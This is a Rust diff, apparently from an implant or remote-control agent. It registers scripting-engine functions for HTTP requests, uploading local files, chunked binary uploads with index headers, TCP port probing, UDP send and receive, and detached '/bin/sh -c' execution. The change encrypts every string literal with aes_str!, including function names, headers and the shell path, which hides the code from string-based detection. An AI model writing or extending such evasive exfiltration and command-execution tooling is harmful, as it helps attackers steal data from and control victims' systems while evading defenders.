@@ -8,28 +8,28 @@ use strcrypt::aes_str;
 pub fn register(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_http_get"), |url: &str| -> String {
         match reqwest::blocking::get(url) {
-            Ok(r)  => r.text().unwrap_or_else(|e| format!("Text Error: {}", e)),
-            Err(e) => format!("Request Error: {}", e),
+            Ok(r)  => r.text().unwrap_or_else(|e| format!("{}{}", aes_str!("Text Error: "), e)),
+            Err(e) => format!("{}{}", aes_str!("Request Error: "), e),
         }
     });
 
     engine.register_fn(&aes_str!("internal_http_post"), |url: &str, body: &str, content_type: &str| -> String {
         let client = reqwest::blocking::Client::new();
         match client.post(url).header(aes_str!("Content-Type"), content_type).body(body.to_owned()).send() {
-            Ok(r)  => r.text().unwrap_or_else(|e| format!("Text Error: {}", e)),
-            Err(e) => format!("Request Error: {}", e),
+            Ok(r)  => r.text().unwrap_or_else(|e| format!("{}{}", aes_str!("Text Error: "), e)),
+            Err(e) => format!("{}{}", aes_str!("Request Error: "), e),
         }
     });
 
     engine.register_fn(&aes_str!("internal_http_post_file"), |url: &str, field: &str, path: &str| -> String {
         let form = match reqwest::blocking::multipart::Form::new().file(field.to_string(), path) {
             Ok(f)  => f,
-            Err(e) => return format!("Form Error: {}", e),
+            Err(e) => return format!("{}{}", aes_str!("Form Error: "), e),
         };
         let client = reqwest::blocking::Client::new();
         match client.post(url).multipart(form).send() {
-            Ok(r)  => r.text().unwrap_or_else(|e| format!("Text Error: {}", e)),
-            Err(e) => format!("Request Error: {}", e),
+            Ok(r)  => r.text().unwrap_or_else(|e| format!("{}{}", aes_str!("Text Error: "), e)),
+            Err(e) => format!("{}{}", aes_str!("Request Error: "), e),
         }
     });
 
@@ -41,16 +41,16 @@ pub fn register(engine: &mut Engine) {
             builder = builder.header(k.as_str(), v.as_str());
         }
         match builder.send() {
-            Ok(r)  => r.text().unwrap_or_else(|e| format!("Text Error: {}", e)),
-            Err(e) => format!("Request Error: {}", e),
+            Ok(r)  => r.text().unwrap_or_else(|e| format!("{}{}", aes_str!("Text Error: "), e)),
+            Err(e) => format!("{}{}", aes_str!("Request Error: "), e),
         }
     });
 
     engine.register_fn(&aes_str!("internal_http_put"), |url: &str, body: &str| -> String {
         let client = reqwest::blocking::Client::new();
         match client.put(url).body(body.to_owned()).send() {
-            Ok(r)  => r.text().unwrap_or_else(|e| format!("Text Error: {}", e)),
-            Err(e) => format!("Request Error: {}", e),
+            Ok(r)  => r.text().unwrap_or_else(|e| format!("{}{}", aes_str!("Text Error: "), e)),
+            Err(e) => format!("{}{}", aes_str!("Request Error: "), e),
         }
     });
 
@@ -68,7 +68,7 @@ pub fn register(engine: &mut Engine) {
                 })
         }) {
             Ok(a)  => a,
-            Err(e) => return format!("Error: {}", e),
+            Err(e) => return format!("{}{}", aes_str!("Error: "), e),
         };
         match TcpStream::connect_timeout(&parsed, timeout) {
             Ok(_)  => aes_str!("open"),
@@ -76,7 +76,7 @@ pub fn register(engine: &mut Engine) {
                 if e.kind() == std::io::ErrorKind::ConnectionRefused {
                     aes_str!("closed")
                 } else {
-                    format!("Error: {}", e)
+                    format!("{}{}", aes_str!("Error: "), e)
                 }
             }
         }
@@ -97,27 +97,27 @@ pub fn register_network_ext(engine: &mut rhai::Engine) {
         let target = format!("{}:{}", host, port);
         match UdpSocket::bind(aes_str!("0.0.0.0:0")) {
             Ok(sock) => match sock.send_to(&data, &target) {
-                Ok(n)  => format!("Sent {} bytes", n),
-                Err(e) => format!("Error: {}", e),
+                Ok(n)  => format!("{}{}{}", aes_str!("Sent "), n, aes_str!(" bytes")),
+                Err(e) => format!("{}{}", aes_str!("Error: "), e),
             },
-            Err(e) => format!("Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Error: "), e),
         }
     });
 
     // Bind a UDP socket and wait for one datagram.
     // Returns hex-encoded received data, or "Error: ...".
     engine.register_fn(&aes_str!("internal_udp_recv"), |port: i64, timeout_ms: i64| -> String {
-        let bind_addr = format!("0.0.0.0:{}", port);
+        let bind_addr = format!("{}:{}", aes_str!("0.0.0.0"), port);
         match UdpSocket::bind(&bind_addr) {
             Ok(sock) => {
                 let _ = sock.set_read_timeout(Some(Duration::from_millis(timeout_ms.max(100) as u64)));
                 let mut buf = vec![0u8; 65535];
                 match sock.recv_from(&mut buf) {
                     Ok((n, _)) => hex::encode(&buf[..n]),
-                    Err(e)     => format!("Error: {}", e),
+                    Err(e)     => format!("{}{}", aes_str!("Error: "), e),
                 }
             }
-            Err(e) => format!("Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Error: "), e),
         }
     });
 
@@ -138,19 +138,19 @@ pub fn register_network_ext(engine: &mut rhai::Engine) {
         let mut errors = Vec::<String>::new();
         for (i, chunk) in data.chunks(size).enumerate() {
             let mut builder = client.post(url)
-                .header("Content-Type", "application/octet-stream")
-                .header("X-Chunk-Index", i.to_string())
-                .header("X-Chunk-Total", total.to_string());
+                .header("Content-Type", aes_str!("application/octet-stream"))
+                .header(aes_str!("X-Chunk-Index"), i.to_string())
+                .header(aes_str!("X-Chunk-Total"), total.to_string());
             for (k, v) in &extra_headers {
-                let val = if v == "auto" { i.to_string() } else { v.clone() };
+                let val = if v == &aes_str!("auto") { i.to_string() } else { v.clone() };
                 builder = builder.header(k.as_str(), val);
             }
             match builder.body(chunk.to_vec()).send() {
                 Ok(_)  => sent += 1,
-                Err(e) => errors.push(format!("chunk {}: {}", i, e)),
+                Err(e) => errors.push(format!("{}{}: {}", aes_str!("chunk "), i, e)),
             }
         }
-        serde_json::json!({ "chunks_sent": sent, "total": total, "errors": errors }).to_string()
+        serde_json::json!({ aes_str!("chunks_sent").as_str(): sent, aes_str!("total").as_str(): total, aes_str!("errors").as_str(): errors }).to_string()
     });
 
     // Launch a process and detach - the child outlives the script.
@@ -161,13 +161,13 @@ pub fn register_network_ext(engine: &mut rhai::Engine) {
         #[cfg(target_os = "linux")]
         {
             // Parse cmd into argv via shell.
-            let child = std::process::Command::new("/bin/sh")
-                .arg("-c")
-                .arg(&format!("{} & disown", cmd))
+            let child = std::process::Command::new(aes_str!("/bin/sh"))
+                .arg(aes_str!("-c"))
+                .arg(&format!("{}{}", cmd, aes_str!(" & disown")))
                 .spawn();
             match child {
                 Ok(mut c) => { let _ = c.wait(); aes_str!("Detached") }
-                Err(e)    => format!("Error: {}", e),
+                Err(e)    => format!("{}{}", aes_str!("Error: "), e),
             }
         }
         #[cfg(target_os = "windows")]
@@ -185,10 +185,10 @@ pub fn register_network_ext(engine: &mut rhai::Engine) {
                 .spawn();
             match child {
                 Ok(c)  => c.id().to_string(),
-                Err(e) => format!("Error: {}", e),
+                Err(e) => format!("{}{}", aes_str!("Error: "), e),
             }
         }
         #[cfg(not(any(target_os = "linux", target_os = "windows")))]
-        format!("Error: exec_detach not supported on this platform")
+        format!("{}", aes_str!("Error: exec_detach not supported on this platform"))
     });
 }
